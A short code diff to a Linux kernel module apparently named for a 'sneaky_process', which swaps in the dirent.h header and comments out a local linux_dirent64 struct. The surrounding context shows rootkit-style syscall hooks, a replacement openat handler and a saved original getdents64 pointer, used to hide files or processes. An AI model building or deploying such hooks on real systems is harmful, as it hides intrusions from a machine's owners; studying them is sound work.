@@ -9,7 +9,7 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 #include <linux/uaccess.h>
-// #include <linux/dirent.h>
+#include <linux/dirent.h>
 
 #define PREFIX "sneaky_process"
 
@@ -71,13 +71,13 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 
 
 /*                             getdents64                               */
-struct linux_dirent64 {
-    u64        d_ino;
-    s64        d_off;
-    unsigned short d_reclen;
-    unsigned char  d_type;
-    char       d_name[];
-};
+// struct linux_dirent64 {
+//     u64        d_ino;
+//     s64        d_off;
+//     unsigned short d_reclen;
+//     unsigned char  d_type;
+//     char       d_name[];
+// };
 
 asmlinkage int (*original_getdents64)(struct pt_regs *);
 
